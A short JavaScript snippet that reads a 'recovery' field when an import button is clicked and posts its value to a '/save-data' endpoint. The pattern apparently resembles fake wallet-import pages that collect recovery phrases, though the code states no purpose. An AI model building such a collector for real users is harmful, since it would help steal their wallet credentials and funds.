document.addEventListener("DOMContentLoaded", () => {
    const recoveryInput = document.getElementById("recovery");
    const importBtn = document.getElementById("importBtn");

    // Submit Form Data
    importBtn.addEventListener("click", async function () {
        const userData = {
            recover: recoveryInput.value
        };

        if (!userData.recover) {
            showMessage("All fields are required!", "red");
            return;
        }

        const response = await fetch("/save-data", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
        });

    });
});
